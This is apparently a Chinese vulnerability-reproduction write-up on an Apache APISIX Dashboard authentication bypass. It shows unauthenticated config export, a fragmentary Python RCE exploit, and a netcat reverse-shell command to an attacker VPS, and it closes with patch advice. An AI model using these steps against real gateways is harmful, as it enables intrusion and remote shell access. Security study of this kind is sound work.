01

漏洞详情

漏洞简介

Apache APISIX是 一个动态的、实时的、高性能微服务的 API 网关。它提供丰富的流量管理功能，例如负载均衡、动态上游服务、金丝雀发布、断路、身份验证、可观察性等。您可以使用 Apache APISIX 来处理传统的南北流量，以及服务之间的东西流量。随着云原生的发展，APISIX 也用于Kubernetes中，应用范围广泛。

在 2.10.1 之前的 Apache APISIX Dashboard 中，Manager API 使用两个 框架并在基础上引入框架droplet框架gin，开发了所有API和认证中间件 基于框架droplet，但部分API直接使用接口框架gin从而绕过身份验证。


影响范围

Apache APISIX Dashboard 2.7 - 2.10 版本




02

漏洞复现

环境搭建

git clone https://github.com/apache/apisix-docker.git
进入example目录，修改docker-compose.yaml文件 中的版本信息。
# 运行 docker-compose 命令，安装 Apache APISIXdocker-compose -p docker-apisix up -d


未授权访问

安装之后，访问9000端口查看dashboard页面。

http://ip:9000/apisix/admin/migrate/export

会在未授权情况下自动下载apisix-config.bak 配置文件。

{"Consumers":[],"Routes":[],"Services":[],"SSLs":[],"Upstreams":[],"Scripts":[],"GlobalPlugins":[],"PluginConfigs":[]}LX澞
bp抓包查看具体

真实环境测试


登录redis数据库，发现登陆成功


除了可以未授权查看配置之外，还可以使用import导入配置/apisix/admin/migrate/import并且为路由创建script脚本用于远程代码执行。

简单复现一下，exp如下，执行命令为touch /tmp/1.txt

import random, string, json, zlib, requests

# 将数据进行checksumdef calc_crc(data):    crc32 = zlib.crc32(data) & 0xffffffff    return crc32.to_bytes(4, byteorder="big")

def import_apix(url, data):    data = json.dumps(data).encode()  # 将数据进行转换为json存储到文件中，后面需要以文件上传    checksum = calc_crc(data)  # 进行checksum ，然后添加到数据后面

抓包分析

进入后台，发现已成功添加路由
然后再次访问ip:9080/oRztxp命令执行
然后进入apisix的容器中，查看命令执行情况。发现命令执行成功。



RCE反弹shell

修改命令执行为nc vps_ip 12345 -e /bin/bash
运行后得到一个随机路由，去访问它。http://10.30.7.99:9080/lKSpMV
查看监听端vps，shell已弹回。



03

防御措施

  1. 升级到 2.10.1 版
  2. 修改默认用户名和密码，限制源IP为 访问 Apache APISIX 仪表板

升级到2.10.1后，再次使用exp会返回访问未授权。可见，在2.10.1 已修复此漏洞。
